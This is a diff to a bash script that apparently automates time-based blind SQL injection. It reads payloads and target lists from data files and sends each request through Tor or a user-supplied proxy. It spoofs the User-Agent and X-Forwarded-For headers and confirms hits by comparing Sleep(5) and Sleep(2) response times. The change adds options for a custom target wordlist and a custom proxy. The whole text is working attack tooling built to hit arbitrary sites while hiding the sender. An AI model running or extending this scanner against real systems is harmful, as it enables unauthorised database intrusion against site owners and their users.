@@ -13,7 +13,15 @@ echo -e "\e[0;33m[\e[0m!\e[0;33m]\e[0m You just toggle on risk mode.. So, as i p
 echo ""
 sleep 3
 
-Cupcake_pie="$(dirname "$0")/../data/targets.txt"
+if [ -n "$custom_wordlist" ]; then
+    if [ ! -f "$custom_wordlist" ]; then
+        exit 1
+    fi
+    Cupcake_pie="$custom_wordlist"
+else
+    Cupcake_pie="$(dirname "$0")/../data/targets.txt"
+fi
+
 Strawberry_pudding="$(dirname "$0")/../data/sqli.txt"
 Choco_muffin="$(dirname "$0")/../data/gentle.txt"
 ROOT_LOG_FILE="$(dirname "$0")/../Target.log"
@@ -65,11 +73,16 @@ time_audit_engine() {
     local mooncake="$2"
     echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Auditing Latency: $target_url$tangyuan$mooncake"
 
-    local stopwatch_seconds=$(curl --socks5-hostname 127.0.0.1:9050 -m 15 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$tangyuan$mooncake")
+    local proxy_flag="--socks5-hostname 127.0.0.1:9050"
+    if [ -n "$custom_proxy" ]; then
+        proxy_flag="-x $custom_proxy"
+    fi
+   
+    local stopwatch_seconds=$(curl $proxy_flag -m 15 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$tangyuan$mooncake")
 
     if (( $(echo "$stopwatch_seconds > 4.0" | bc -l) )); then
         local lapis_legit=$(echo "$mooncake" | sed 's/Sleep(5)/Sleep(2)/g' | sed 's/sleep(5)/sleep(2)/g')
-        local wash_hands_now=$(curl --socks5-hostname 127.0.0.1:9050 -m 10 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$tangyuan$lapis_legit")
+        local wash_hands_now=$(curl $proxy_flag -m 10 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$tangyuan$lapis_legit")
 
         if (( $(echo "$wash_hands_now > 1.5" | bc -l) )) && (( $(echo "$wash_hands_now < 3.5" | bc -l) )); then
             echo -e "[i] Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
